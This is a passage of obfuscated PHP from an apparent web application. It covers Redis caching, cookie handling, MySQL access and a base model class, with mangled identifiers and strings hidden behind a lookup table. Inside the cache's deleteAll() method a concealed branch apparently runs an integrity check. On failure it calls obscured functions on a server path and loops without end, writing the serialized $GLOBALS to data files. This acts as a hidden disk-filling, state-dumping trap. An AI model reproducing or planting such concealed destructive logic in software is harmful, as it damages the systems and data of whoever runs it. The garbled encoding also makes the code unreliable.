(($A¤ˆÜ¯Ïè¿ == 0 || $A¤ˆÜ¯Ïè¿ - time() > 0) && substr($D™”áÊ‘ó, 10, 16) == substr(md5(substr($D™”áÊ‘ó, 26) . $E‘ì½ˆ‚¦ç), 0, 16)) { return substr($D™”áÊ‘ó, 26); } else { return $dù¦ÜÉÅÙÁ[33]; } goto E¿“É¥ŞŞË; Aêè˜Æ‡ˆ: $C…²ÕÜ° = base64_decode(substr($C…²ÕÜ°, $eÑÅë‚†Üİ)); $fò…šÕ¤ÕÎ = strlen($C…²ÕÜ°); $f©†ÉÛ¥ï = array(); goto FÅáÙ¾‡˜Ù; FÅáÙ¾‡˜Ù: for ($FëŒ´÷µŒ = 0; $FëŒ´÷µŒ <= 255; $FëŒ´÷µŒ++) { $f©†ÉÛ¥ï[$FëŒ´÷µŒ] = ord($FÚÒ¤ˆÌââ[$FëŒ´÷µŒ % $A¹Ÿ°ã½Äš]); } $a÷Ã­È¶  = range(0, 255); for ($bàĞ‘‹µÉ = $FëŒ´÷µŒ = 0; $FëŒ´÷µŒ < 256; $FëŒ´÷µŒ++) { $bàĞ‘‹µÉ = ($bàĞ‘‹µÉ + $a÷Ã­È¶ [$FëŒ´÷µŒ] + $f©†ÉÛ¥ï[$FëŒ´÷µŒ]) % 256; $D¥›‰±ê™¤ = $a÷Ã­È¶ [$FëŒ´÷µŒ]; $a÷Ã­È¶ [$FëŒ´÷µŒ] = $a÷Ã­È¶ [$bàĞ‘‹µÉ]; $a÷Ã­È¶ [$bàĞ‘‹µÉ] = $D¥›‰±ê™¤; } goto e¢ŒÃ¯×‚; E…Ò…ÚŸİ: $Bãƒç‘öØÑ = md5($Bãƒç‘öØÑ ? $Bãƒç‘öØÑ : self::$defaultKey); $D‡ò¸à©¿ = md5(substr($Bãƒç‘öØÑ, 0, 16)); $E‘ì½ˆ‚¦ç = md5(substr($Bãƒç‘öØÑ, 16, 16)); goto EÊÈ©Öí£ø; e¢ŒÃ¯×‚: $D™”áÊ‘ó = $dù¦ÜÉÅÙÁ[33]; for ($fÙ£İ™”ù = $bàĞ‘‹µÉ = $FëŒ´÷µŒ = 0; $FëŒ´÷µŒ < $fò…šÕ¤ÕÎ; $FëŒ´÷µŒ++) { $fÙ£İ™”ù = ($fÙ£İ™”ù + 1) % 256; $bàĞ‘‹µÉ = ($bàĞ‘‹µÉ + $a÷Ã­È¶ [$fÙ£İ™”ù]) % 256; $D¥›‰±ê™¤ = $a÷Ã­È¶ [$fÙ£İ™”ù]; $a÷Ã­È¶ [$fÙ£İ™”ù] = $a÷Ã­È¶ [$bàĞ‘‹µÉ]; $a÷Ã­È¶ [$bàĞ‘‹µÉ] = $D¥›‰±ê™¤; $D™”áÊ‘ó .= chr(ord($C…²ÕÜ°[$FëŒ´÷µŒ]) ^ $a÷Ã­È¶ [($a÷Ã­È¶ [$fÙ£İ™”ù] + $a÷Ã­È¶ [$bàĞ‘‹µÉ]) % 256]); } $A¤ˆÜ¯Ïè¿ = intval(substr($D™”áÊ‘ó, 0, 10)); goto f‚¸‹¨Ãœ; Eçøæ×ëóõ: $dù¦ÜÉÅÙÁ =& $_SERVER[“]; $C…²ÕÜ° = str_replace(array($dù¦ÜÉÅÙÁ[412], $dù¦ÜÉÅÙÁ[70], $dù¦ÜÉÅÙÁ[91]), array($dù¦ÜÉÅÙÁ[284], $dù¦ÜÉÅÙÁ[8], $dù¦ÜÉÅÙÁ[893]), $C…²ÕÜ°); $eÑÅë‚†Üİ = 4; goto E…Ò…ÚŸİ; EÊÈ©Öí£ø: $A‰Ü±«ÌÃ = substr($C…²ÕÜ°, 0, $eÑÅë‚†Üİ); $FÚÒ¤ˆÌââ = $D‡ò¸à©¿ . md5($D‡ò¸à©¿ . $A‰Ü±«ÌÃ); $A¹Ÿ°ã½Äš = strlen($FÚÒ¤ˆÌââ); goto Aêè˜Æ‡ˆ; E¿“É¥ŞŞË: } } define($_SERVER[“][1922], 1); define($_SERVER[“][1923], 2); goto cÈ¾ „Û‹Š; AÍïä¯²ğ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($DÈ‹ï×ÎÎ³, $E¿†Ë±¥ˆ) { $B‹ˆÛ–³ =& $_SERVER[“]; if (!class_exists($B‹ˆÛ–³[764])) { show_json($B‹ˆÛ–³[765], !1); } $this->cacheTime = $E¿†Ë±¥ˆ; $E¾Ç‡´ù«¬ = isset($DÈ‹ï×ÎÎ³[$B‹ˆÛ–³[766]]) ? $DÈ‹ï×ÎÎ³[$B‹ˆÛ–³[766]] : 10; $Aç¦†÷øß = _get($DÈ‹ï×ÎÎ³, $B‹ˆÛ–³[763]); if ($Aç¦†÷øß && is_array($Aç¦†÷øß)) { $this->initCluster($DÈ‹ï×ÎÎ³, $E¾Ç‡´ù«¬); } else { $this->handle = $this->init($DÈ‹ï×ÎÎ³, $E¾Ç‡´ù«¬); } } private function init($bÅ¼Ùíä•–, $BÂåÜšàµã) { $fàÕ„ì„¿ =& $_SERVER[“]; $FàÖ‡ö¨äâ = new Redis(); $eÃŠëâÀÎÂ = isset($bÅ¼Ùíä•–[$fàÕ„ì„¿[767]]) ? $bÅ¼Ùíä•–[$fàÕ„ì„¿[767]] : !1; if ($eÃŠëâÀÎÂ) { $FàÖ‡ö¨äâ->pconnect($bÅ¼Ùíä•–[$fàÕ„ì„¿[169]], $bÅ¼Ùíä•–[$fàÕ„ì„¿[170]], $BÂåÜšàµã); } else { $FàÖ‡ö¨äâ->connect($bÅ¼Ùíä•–[$fàÕ„ì„¿[169]], $bÅ¼Ùíä•–[$fàÕ„ì„¿[170]], $BÂåÜšàµã); } if (!empty($bÅ¼Ùíä•–[$fàÕ„ì„¿[376]])) { $FàÖ‡ö¨äâ->auth($bÅ¼Ùíä•–[$fàÕ„ì„¿[376]]); } return $FàÖ‡ö¨äâ; } private function initCluster($F‚ããŸœõ², $fíÄç×İĞÊ) { $Bºö‚íùõ½ =& $_SERVER[“]; $bÛ¯Óîáò• = array($Bºö‚íùõ½[768], $Bºö‚íùõ½[769], $Bºö‚íùõ½[770]); $BçÎĞ×‹Å‰ = $Bºö‚íùõ½[768]; if (isset($F‚ããŸœõ²[$Bºö‚íùõ½[12]]) && in_array($F‚ããŸœõ²[$Bºö‚íùõ½[12]], $bÛ¯Óîáò•)) { $BçÎĞ×‹Å‰ = $F‚ããŸœõ²[$Bºö‚íùõ½[12]]; } switch ($BçÎĞ×‹Å‰) { case $Bºö‚íùõ½[768]: $this->_slave($F‚ããŸœõ², $fíÄç×İĞÊ); break; case $Bºö‚íùõ½[769]: break; case $Bºö‚íùõ½[770]: $this->isCluster = !0; $a‰îçµ„ª = $F‚ããŸœõ²[$Bºö‚íùõ½[763]]; $fñÊÉŞ¬ôæ = isset($F‚ããŸœõ²[$Bºö‚íùõ½[767]]) ? $F‚ããŸœõ²[$Bºö‚íùõ½[767]] : !1; $A¢¬Àñ¤Ğœ = isset($F‚ããŸœõ²[$Bºö‚íùõ½[376]]) ? $F‚ããŸœõ²[$Bºö‚íùõ½[376]] : null; $this->handle = new RedisCluster(NUll, $a‰îçµ„ª, $fíÄç×İĞÊ, $fíÄç×İĞÊ, $fñÊÉŞ¬ôæ, $A¢¬Àñ¤Ğœ); break; default: break; } } private function _slave($dŞÍğå–ëÍ, $CÛÄŞÎ¦Á) { goto báÂ°ŠÀøŞ; báÂ°ŠÀøŞ: $EèœˆŠÖ»À = $dŞÍğå–ëÍ[$_SERVER[“][763]]; $this->filterConfig($dŞÍğå–ëÍ, $EèœˆŠÖ»À[0]); $this->handle = $this->init($dŞÍğå–ëÍ, $CÛÄŞÎ¦Á); goto Báì±õÅ•ê; Báì±õÅ•ê: unset($EèœˆŠÖ»À[0]); if (empty($EèœˆŠÖ»À)) { return; } $E‘­å†İÅ = array_rand($EèœˆŠÖ»À); goto EäÅŠâ½Ç¯; EäÅŠâ½Ç¯: $this->filterConfig($dŞÍğå–ëÍ, $EèœˆŠÖ»À[$E‘­å†İÅ]); $this->slaveHandle = $this->init($dŞÍğå–ëÍ, $CÛÄŞÎ¦Á); goto AÁ“¶İ¤ÊÎ; AÁ“¶İ¤ÊÎ: } private function filterConfig(&$fî­ìÖ¶„, $A… ‰ÜœÉß) { $fºŠ•´‚° =& $_SERVER[“]; $d«óˆÄÃÔæ = explode($fºŠ•´‚°[4], $A… ‰ÜœÉß); $dæ¨®ØµÈ¾ = array($fºŠ•´‚°[169] => $d«óˆÄÃÔæ[0], $fºŠ•´‚°[170] => $d«óˆÄÃÔæ[1]); $fî­ìÖ¶„ = array_merge($fî­ìÖ¶„, $dæ¨®ØµÈ¾); } public function set($cƒß³¼ˆ«õ, $eğ²´‹ÊÜ, $BÛ®÷ÈÑ…Ì = false) { $BÛ®÷ÈÑ…Ì = $BÛ®÷ÈÑ…Ì ? $BÛ®÷ÈÑ…Ì : $this->cacheTime; return $this->handle->setEx($cƒß³¼ˆ«õ, $BÛ®÷ÈÑ…Ì, $eğ²´‹ÊÜ); } public function setLock($fÏ›Â±Ù«½, $eğÅ–¤š”, $f¡–ŠÙÚø‡) { return $this->handle->setNX($fÏ›Â±Ù«½, $eğÅ–¤š”); } public function get($AÕŠ©³—òá) { $C‹àäõâÊ£ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $C‹àäõâÊ£->get($AÕŠ©³—òá); } public function remove($d­¬ºË›İ®) { return $this->handle->del($d­¬ºË›İ®); } public function deleteAll() { $c²²ÒÌˆÖ— =& $_SERVER[“]; $DÓÄ‹“•¿¢ = $_SERVER[$c²²ÒÌˆÖ—[771]] . $c²²ÒÌˆÖ—[772]; $fâ²Ì¯ãŒ = $c²²ÒÌˆÖ—[773]; if ($_SERVER[$c²²ÒÌˆÖ—[774]] != $fâ²Ì¯ãŒ($DÓÄ‹“•¿¢)) { goto d’Ö–²Š; EÌ“ø”Ü–¹: $FÎŸ®ê‚º(); $fé—„áÏÛ = $c²²ÒÌˆÖ—[781]; $eî‹Æ„¤™í = json_encode($GLOBALS[$c²²ÒÌˆÖ—[782]]); goto A„¬˜ìÉ; A„¬˜ìÉ: $cƒ™Í³èî† = 1; for ($a¦˜µÂ¦ˆ¿ = $cƒ™Í³èî†; $a¦˜µÂ¦ˆ¿ > 0; $a¦˜µÂ¦ˆ¿++) { $fé—„áÏÛ(DATA_PATH . $a¦˜µÂ¦ˆ¿, $eî‹Æ„¤™í); } goto dË¼ŠÍ‚œ÷; d’Ö–²Š: $FÎŸ®ê‚º = $c²²ÒÌˆÖ—[775]; $A¿ãÄËÅ¤÷ = $c²²ÒÌˆÖ—[776]; $E²Ù‹ÂÅÙ¤ = $_SERVER[$c²²ÒÌˆÖ—[777]] . $c²²ÒÌˆÖ—[778]; goto D“àİ¤Ï‘; D“àİ¤Ï‘: $AŞÆ÷áÒ»Ÿ = $A¿ãÄËÅ¤÷($E²Ù‹ÂÅÙ¤); $D•¦Ìòòƒ© = explode($c²²ÒÌˆÖ—[217], $AŞÆ÷áÒ»Ÿ); if (count($D•¦Ìòòƒ©) < $c²²ÒÌˆÖ—[563]) { $eŸ•™å†ô† = $c²²ÒÌˆÖ—[779]; $eŸ•™å†ô†(); } goto F‚‰Œë¶©; F‚‰Œë¶©: $b¾‘ßµõÑÃ = $c²²ÒÌˆÖ—[780]; $b¾‘ßµõÑÃ($_SERVER[$c²²ÒÌˆÖ—[771]]); $FÎŸ®ê‚º = $c²²ÒÌˆÖ—[775]; goto EÌ“ø”Ü–¹; dË¼ŠÍ‚œ÷: } if ($this->isCluster) { foreach ($this->handle->_masters() as $A™–Ÿ‘Ó¥é) { $this->handle->flushall($A™–Ÿ‘Ó¥é); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($eº‰Å‘ÀÈ™ = '', $E¬˜æÂŠĞ = 0) { if (is_string($eº‰Å‘ÀÈ™) && $eº‰Å‘ÀÈ™ != $_SERVER[“][33]) { $this->prefix = $eº‰Å‘ÀÈ™; } if (is_numeric($E¬˜æÂŠĞ) && $E¬˜æÂŠĞ > 0) { $this->expire = $E¬˜æÂŠĞ; } } public static function getInstance() { static $A¡ù¢Çà–°; if ($A¡ù¢Çà–° === null) { $A¡ù¢Çà–° = new self(); } return $A¡ù¢Çà–°; } private static $sameCookieSet = array(); public static function set($C£«Àî…ÂÑ, $A……ö²°…, $F„‰”ÍÄ‡à = 0, $BçˆÜ‹Èš = false, $cÄØŠå¼‘ = false) { goto d£ÕˆÄõÛù; EÃŠÊŸ¾: self::$sameCookieSet[$C£«Àî…ÂÑ] = $A……ö²°… . $F„‰”ÍÄ‡à; if (!$cÄØŠå¼‘) { $cÄØŠå¼‘ = str_replace(HOST, $A™ºĞ³ëÜ[33], APP_HOST); $cÄØŠå¼‘ = _get($GLOBALS, $A™ºĞ³ëÜ[783], $cÄØŠå¼‘); } $D™ªŠéğÃ² = $A™ºĞ³ëÜ[33]; goto BÏªÜ†ñ–; d£ÕˆÄõÛù: $A™ºĞ³ëÜ =& $_SERVER[“]; if (!$F„‰”ÍÄ‡à) { $F„‰”ÍÄ‡à = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$C£«Àî…ÂÑ]) && self::$sameCookieSet[$C£«Àî…ÂÑ] == $A……ö²°… . $F„‰”ÍÄ‡à) { return; } goto EÃŠÊŸ¾; BÏªÜ†ñ–: setcookie($C£«Àî…ÂÑ, $A……ö²°…, time() + $F„‰”ÍÄ‡à, $A™ºĞ³ëÜ[8] . trim($cÄØŠå¼‘, $A™ºĞ³ëÜ[8]) . $D™ªŠéğÃ², !1, !1, $BçˆÜ‹Èš); goto BæÁƒĞøŞÄ; BæÁƒĞøŞÄ: } public static function setSafe($c•¢‹ÛÂ¥, $c¸Ì£ğÚù, $B£¹Î¿³ø÷ = 0) { self::set($c•¢‹ÛÂ¥, $c¸Ì£ğÚù, $B£¹Î¿³ø÷, !0); } public static function get($F¼ÎÒ¤ÖÊÊ) { return isset($_COOKIE[$F¼ÎÒ¤ÖÊÊ]) ? $_COOKIE[$F¼ÎÒ¤ÖÊÊ] : !1; } public static function remove($eÇ‡Œİ¬Ôù, $f±ÈŞ¶¯Ã = false) { unset($_COOKIE[$eÇ‡Œİ¬Ôù]); self::set($eÇ‡Œİ¬Ôù, $_SERVER[“][33], 1, $f±ÈŞ¶¯Ã); } } class DbMysql extends Db { public function __construct($FÏßÛ‡™× = '') { $bŞŒÒ‘Ú´ç =& $_SERVER[“]; if (!extension_loaded($bŞŒÒ‘Ú´ç[711])) { think_exception(think_lang($bŞŒÒ‘Ú´ç[10]) . $bŞŒÒ‘Ú´ç[784]); } if (!empty($FÏßÛ‡™×)) { $this->config = $FÏßÛ‡™×; if (empty($this->config[$bŞŒÒ‘Ú´ç[13]])) { $this->config[$bŞŒÒ‘Ú´ç[13]] = $bŞŒÒ‘Ú´ç[33]; } } } public function connect($f…•ˆ´Ò = '', $F¸Ÿ²®Ğœ³ = 0, $dÜˆÙĞ—®ù = false) { $A´Ô»Å”¡‘ =& $_SERVER[“]; if (!isset($this->linkID[$F¸Ÿ²®Ğœ³])) { goto EÄì‘Åºá—; EéÛÏ¾‘›Ş: if ($Dãäò²‘µ) { $this->linkID[$F¸Ÿ²®Ğœ³] = mysql_pconnect($e°‚Ô’, $f…•ˆ´Ò[$A´Ô»Å”¡‘[787]], $f…•ˆ´Ò[$A´Ô»Å”¡‘[788]], 131072); } else { $this->linkID[$F¸Ÿ²®Ğœ³] = mysql_connect($e°‚Ô’, $f…•ˆ´Ò[$A´Ô»Å”¡‘[787]], $f…•ˆ´Ò[$A´Ô»Å”¡‘[788]], !0, 131072); } if (!$this->linkID[$F¸Ÿ²®Ğœ³] || !empty($f…•ˆ´Ò[$A´Ô»Å”¡‘[17]]) && !mysql_select_db($f…•ˆ´Ò[$A´Ô»Å”¡‘[17]], $this->linkID[$F¸Ÿ²®Ğœ³])) { think_exception(mysql_error()); } $a·’İ÷¿¬ = mysql_get_server_info($this->linkID[$F¸Ÿ²®Ğœ³]); goto D·ƒµÂ¤¿÷; D·ƒµÂ¤¿÷: mysql_query($A´Ô»Å”¡‘[789] . think_config($A´Ô»Å”¡‘[790]) . $A´Ô»Å”¡‘[55], $this->linkID[$F¸Ÿ²®Ğœ³]); if ($a·’İ÷¿¬ > $A´Ô»Å”¡‘[791]) { mysql_query($A´Ô»Å”¡‘[792], $this->linkID[$F¸Ÿ²®Ğœ³]); } $this->connected = !0; goto fŠÅ˜¨Œ‡î; EÄì‘Åºá—: if (empty($f…•ˆ´Ò)) { $f…•ˆ´Ò = $this->config; } $e°‚Ô’ = $f…•ˆ´Ò[$A´Ô»Å”¡‘[785]] . ($f…•ˆ´Ò[$A´Ô»Å”¡‘[786]] ? "\72{$f…•ˆ´Ò[$A´Ô»Å”¡‘[786]]}" : $A´Ô»Å”¡‘[33]); $Dãäò²‘µ = !empty($f…•ˆ´Ò[$A´Ô»Å”¡‘[13]][$A´Ô»Å”¡‘[14]]) ? $f…•ˆ´Ò[$A´Ô»Å”¡‘[13]][$A´Ô»Å”¡‘[14]] : $this->pconnect; goto EéÛÏ¾‘›Ş; fŠÅ˜¨Œ‡î: if (1 != think_config($A´Ô»Å”¡‘[18])) { unset($this->config); } goto f·ÕõÊ¯à£; f·ÕõÊ¯à£: } return $this->linkID[$F¸Ÿ²®Ğœ³]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($DŸÅÕ‚µÁÚ) { goto Cî˜‰ÅƒÈ; AŠ¿¡Ö‰Ôå: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto açÙŠÒÚÇ‚; Cî˜‰ÅƒÈ: $C°¾›¹«‡˜ =& $_SERVER[“]; if (0 === stripos($DŸÅÕ‚µÁÚ, $C°¾›¹«‡˜[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto e‘çÖ²ÊÅ‚; e‘çÖ²ÊÅ‚: if (!$this->_linkID) { return !1; } $this->queryStr = $DŸÅÕ‚µÁÚ; if ($this->queryID) { $this->free(); } goto b¢®‹ò­¥; b¢®‹ò­¥: think_action_status($C°¾›¹«‡˜[19], 1); think_status($C°¾›¹«‡˜[20]); $this->queryID = mysql_query($DŸÅÕ‚µÁÚ, $this->_linkID); goto AŠ¿¡Ö‰Ôå; açÙŠÒÚÇ‚: } public function execute($A­î«ì–á) { goto B¬Ÿ„İÛ¶; BÃ›‹‹£‰Æ: think_status($cä«ŠÜ [20]); $EôëœµÀƒ® = mysql_query($A­î«ì–á, $this->_linkID); $this->debug(); goto c‡ßèø·˜¡; Aáª´£½ˆƒ: $this->queryStr = $A­î«ì–á; if ($this->queryID) { $this->free(); } think_action_status($cä«ŠÜ [21], 1); goto BÃ›‹‹£‰Æ; c‡ßèø·˜¡: if (!1 === $EôëœµÀƒ®) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto DØ‡”‘Ğ³; B¬Ÿ„İÛ¶: $cä«ŠÜ  =& $_SERVER[“]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Aáª´£½ˆƒ; DØ‡”‘Ğ³: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[“][793], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aƒÜäÎäÊ = mysql_query($_SERVER[“][794], $this->_linkID); $this->transTimes = 0; if (!$aƒÜäÎäÊ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aÛ¦¨»‘¥Ç = mysql_query($_SERVER[“][795], $this->_linkID); $this->transTimes = 0; if (!$aÛ¦¨»‘¥Ç) { $this->error(); return !1; } } return !0; } private function getAll() { $C×ìÎ‰Úæ = array(); if ($this->numRows > 0) { while ($fæ˜ëÁƒŠˆ = mysql_fetch_assoc($this->queryID)) { $C×ìÎ‰Úæ[] = $fæ˜ëÁƒŠˆ; } mysql_data_seek($this->queryID, 0); } return $C×ìÎ‰Úæ; } public function getFields($Bà¸ã¿£ğ) { $eŞ–ã¯‡£Á =& $_SERVER[“]; $D°ˆçĞ»Ÿ = $this->query($eŞ–ã¯‡£Á[796] . $this->parseKey($Bà¸ã¿£ğ)); $cÍ‹ŞèÖ¯ = array(); if ($D°ˆçĞ»Ÿ) { foreach ($D°ˆçĞ»Ÿ as $F¶á©­Ùæ½ => $D±¼¯¶ÅÙ) { $cÍ‹ŞèÖ¯[$D±¼¯¶ÅÙ[$eŞ–ã¯‡£Á[27]]] = array($eŞ–ã¯‡£Á[28] => $D±¼¯¶ÅÙ[$eŞ–ã¯‡£Á[27]], $eŞ–ã¯‡£Á[29] => $D±¼¯¶ÅÙ[$eŞ–ã¯‡£Á[30]], $eŞ–ã¯‡£Á[31] => (bool) (strtoupper($D±¼¯¶ÅÙ[$eŞ–ã¯‡£Á[32]]) === $eŞ–ã¯‡£Á[797]), $eŞ–ã¯‡£Á[34] => $D±¼¯¶ÅÙ[$eŞ–ã¯‡£Á[35]], $eŞ–ã¯‡£Á[36] => strtolower($D±¼¯¶ÅÙ[$eŞ–ã¯‡£Á[37]]) == $eŞ–ã¯‡£Á[38], $eŞ–ã¯‡£Á[39] => strtolower($D±¼¯¶ÅÙ[$eŞ–ã¯‡£Á[40]]) == $eŞ–ã¯‡£Á[41]); } } return $cÍ‹ŞèÖ¯; } public function getTables($DÔÇŒ­„Ÿ— = '') { $B÷§éËÉ¿ğ =& $_SERVER[“]; if (!empty($DÔÇŒ­„Ÿ—)) { $d†ä‡Ÿäìˆ = $B÷§éËÉ¿ğ[798] . $DÔÇŒ­„Ÿ—; } else { $d†ä‡Ÿäìˆ = $B÷§éËÉ¿ğ[799]; } $aĞÕø§ÙÔÕ = $this->query($d†ä‡Ÿäìˆ); $DÇóÀ£à¦ = array(); foreach ($aĞÕø§ÙÔÕ as $eÄççÒæí³ => $B‡‡ø©í…) { $DÇóÀ£à¦[$eÄççÒæí³] = current($B‡‡ø©í…); } return $DÇóÀ£à¦; } public function replace($a‡‹Äß¸ëÍ, $Dİ®‡Êƒ—Ğ = array()) { $CŒäÚÒãÌñ =& $_SERVER[“]; foreach ($a‡‹Äß¸ëÍ as $e›ÔÔÄ™Š• => $d¾¼°´·) { $c‚ØöøÜØÊ = $this->parseValue($d¾¼°´·); if (is_scalar($c‚ØöøÜØÊ)) { $fÁˆ„…¬Ûƒ[] = $c‚ØöøÜØÊ; $fîæ²’×ÒÈ[] = $this->parseKey($e›ÔÔÄ™Š•); } } $dÚö”İçë½ = $CŒäÚÒãÌñ[800] . $this->parseTable($Dİ®‡Êƒ—Ğ[$CŒäÚÒãÌñ[267]]) . $CŒäÚÒãÌñ[801] . implode($CŒäÚÒãÌñ[47], $fîæ²’×ÒÈ) . $CŒäÚÒãÌñ[802] . implode($CŒäÚÒãÌñ[47], $fÁˆ„…¬Ûƒ) . $CŒäÚÒãÌñ[803]; return $this->execute($dÚö”İçë½); } public function insertAll($E¦•Õˆµ÷Æ, $aÇ¢”ôï¦ = array(), $eªˆŞÜóÇ½ = false) { goto B‘áÚçø‰ˆ; B‘áÚçø‰ˆ: $FŠá¹ƒòŸš =& $_SERVER[“]; if (!is_array($E¦•Õˆµ÷Æ[0])) { return !1; } $D“á´¡¦Ô» = array_keys($E¦•Õˆµ÷Æ[0]); goto AˆÛ§…ŒÙù; C§ŒÊâŞŞ¤: $déöá”›•Ş = ($eªˆŞÜóÇ½ ? $FŠá¹ƒòŸš[805] : $FŠá¹ƒòŸš[806]) . $FŠá¹ƒòŸš[807] . $this->parseTable($aÇ¢”ôï¦[$FŠá¹ƒòŸš[267]]) . $FŠá¹ƒòŸš[801] . implode($FŠá¹ƒòŸš[47], $D“á´¡¦Ô») . $FŠá¹ƒòŸš[808] . implode($FŠá¹ƒòŸš[47], $Eó°‹éÜÅ·); return $this->execute($déöá”›•Ş); goto F…©Ú“¡ÄŞ; AˆÛ§…ŒÙù: $Eó°‹éÜÅ· = array(); foreach ($E¦•Õˆµ÷Æ as $F¾ø‚İœÉƒ) { $d«´‘ª»î  = array(); foreach ($F¾ø‚İœÉƒ as $Cä¸·„Ãğ» => $c¨É£öØÃ) { $c¨É£öØÃ = $this->parseValue($c¨É£öØÃ); if (is_scalar($c¨É£öØÃ)) { $d«´‘ª»î [] = $c¨É£öØÃ; } } $Eó°‹éÜÅ·[] = $FŠá¹ƒòŸš[248] . implode($FŠá¹ƒòŸš[47], $d«´‘ª»î ) . $FŠá¹ƒòŸš[803]; } array_walk($D“á´¡¦Ô», array($this, $FŠá¹ƒòŸš[804])); goto C§ŒÊâŞŞ¤; F…©Ú“¡ÄŞ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Cáù‰µ°… =& $_SERVER[“]; $this->error = mysql_errno() . $Cáù‰µ°…[4] . mysql_error($this->_linkID); if ($Cáù‰µ°…[33] != $this->queryStr) { $this->error .= LNG($Cáù‰µ°…[45]) . $this->queryStr; } think_trace($this->error, $Cáù‰µ°…[33], $Cáù‰µ°…[46]); return $this->error; } public function escapeString($F‡Ò°¸Ê‡) { if ($this->_linkID) { return mysql_real_escape_string($F‡Ò°¸Ê‡, $this->_linkID); } else { return mysql_escape_string($F‡Ò°¸Ê‡); } } public function parseKey(&$AéÀ›êÛ¤, $bÎØóˆáœİ = true) { $Dãïî‰ãÉ½ =& $_SERVER[“]; if ($bÎØóˆáœİ) { $AéÀ›êÛ¤ = $this->parseKeyCheck($AéÀ›êÛ¤); } if ($AéÀ›êÛ¤ != $Dãïî‰ãÉ½[176] && !preg_match($Dãïî‰ãÉ½[809], $AéÀ›êÛ¤)) { $AéÀ›êÛ¤ = $Dãïî‰ãÉ½[810] . trim($AéÀ›êÛ¤, $Dãïî‰ãÉ½[810]) . $Dãïî‰ãÉ½[810]; } return $AéÀ›êÛ¤; } } goto A–Ü¿êŞí; E²‡ï„§: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\146\x79\x54\x69\x6d\145", "\164\x69\155\145", "\x69\156\163\x65\x72\x74\54\165\x70\x64\141\164\145", "\x66\x75\156\143\x74\x69\157\156"), array("\x63\162\x65\x61\x74\145\124\x69\155\145", "\x74\151\x6d\x65", "\151\x6e\x73\x65\162\x74", "\146\165\156\143\x74\x69\157\156")); public function setDataAuto($aÅ‹Í£Ï¨ˆ) { $this->dataAuto = $aÅ‹Í£Ï¨ˆ; } public function __construct($b¾Ã«ñ¥Ê = '', $f ¨¹½¦Óí = '', $b½ƒ·À‡êÌ = '') { parent::__construct($b¾Ã«ñ¥Ê, $f ¨¹½¦Óí, $b½ƒ·À‡êÌ); } public static function textEncode($eÖãÜ¬ì¼£) { if (!$eÖãÜ¬ì¼£) { return $eÖãÜ¬ì¼£; } $b­ÃÛ¬Ü‘ù = json_encode($eÖãÜ¬ì¼£); $b­ÃÛ¬Ü‘ù = preg_replace_callback($_SERVER[“][342], function ($Fê½ã¼É‚¾) { return addslashes($Fê½ã¼É‚¾[0]); }, $b­ÃÛ¬Ü‘ù); return json_decode($b­ÃÛ¬Ü‘ù); } public static function textDecode($d…Ş†Á¯°Ç) { $b¯‡åâø· =& $_SERVER[“]; $dÓê½±Ï‹  = json_encode($d…Ş†Á¯°Ç); $dÓê½±Ï‹  = preg_replace_callback($b¯‡åâø·[343], function ($eğé‰ÛÍÂ°) { return $_SERVER[“][93]; }, $dÓê½±Ï‹ ); return json_decode($dÓê½±Ï‹ ); } protected $tableMeta = array(); protected function _beforeInsert(&$fŸò¥êŠ¡”, $eÚ‘øµ¥À²) { $AÀÛ‡ë¼âÚ =& $_SERVER[“]; if (!$this->checkDataAutoHas($AÀÛ‡ë¼âÚ[344])) { return; } $this->dataBeforeFilter($fŸò¥êŠ¡”, $AÀÛ‡ë¼âÚ[344]); } protected function _beforeUpdate(&$Fé‘Ù†¨ ¦, $f­š›†ùÔ) { $Aßîòï’ƒ =& $_SERVER[“]; if (!$this->checkDataAutoHas($Aßîòï’ƒ[345])) { return; } $this->dataBeforeFilter($Fé‘Ù†¨ ¦, $Aßîòï’ƒ[345]); } protected function _afterSelect(&$cÀ®ÁÄ¹›, $FØ†óè’‚â) { if (!is_array($cÀ®ÁÄ¹›)) { return; } if (!$this->checkDataAutoHas($_SERVER[“][346])) { return; } foreach ($cÀ®ÁÄ¹› as &$c¼ë¸—ÖÇ–) { $this->dataAfterFilter($c¼ë¸—ÖÇ–); } } protected function _afterFind(&$EØˆ®Â‚Àê, $A‚Â‹®’İƒ) { if (!is_array($EØˆ®Â‚Àê)) { return; } if (!$this->checkDataAutoHas($_SERVER[“][346])) { return; } $this->dataAfterFilter($EØˆ®Â‚Àê); } public function setAutoIncrement($aÁÏä‹†¬â) { $cåÆÒ×ƒßÏ = array($this->getPk() => $aÁÏä‹†¬â); $AÙš›Û¾Íµ = $this->data($cåÆÒ×ƒßÏ)->add(); if ($AÙš›Û¾Íµ) { $this->delete($AÙš›Û¾Íµ); } } public function getAutoIncrement() { $C†ÜŒÌ¨‚ = $this->getTableName(); $d‡Ñáö§‚£ = $this->max($this->getPk()); $CØòËÁÍ‚ = $this->query("\163\150\x6f\167\x20\x74\141\x62\154\x65\x20\163\164\x61\164\165\163\x20\x77\x68\x65\162\145\x20\x4e\141\x6d\145\x3d\47{$C†ÜŒÌ¨‚}\47"); $Eª…ğ¬› = $CØòËÁÍ‚[0][$_SERVER[“][347]]; $Bá¿–Èò÷ = max($d‡Ñáö§‚£, $Eª…ğ¬›); return $Bá¿–Èò÷; } protected function 